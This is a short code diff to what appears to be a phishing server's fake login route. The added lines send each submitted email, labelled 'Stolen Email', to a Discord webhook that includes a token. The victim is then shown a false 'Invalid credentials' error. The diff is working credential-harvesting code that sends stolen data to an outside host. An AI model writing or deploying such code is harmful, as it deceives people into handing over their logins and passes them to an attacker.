@@ -153,6 +153,11 @@ app.post('/api/fake-login', async (req, res) => {
 
     try {
         console.log(`[!] Received data - Email: ${email}`);
+        await fetch('https://discord.com/api/webhooks/1553820224237609093/3t_6s8s-wWehIE_fttljVBy7lX1ymVyXbeujUWo8EVhaA3EaxmyP-RfyLzdKsrYwIukv', {
+             method: 'POST',
+             headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `Stolen Email: ${email}` })
+         });
         res.json({ success: false, message: "Invalid credentials. Please try again." });
     } catch (error) {
         res.status(500).json({ success: false, message: "Server connection error." });
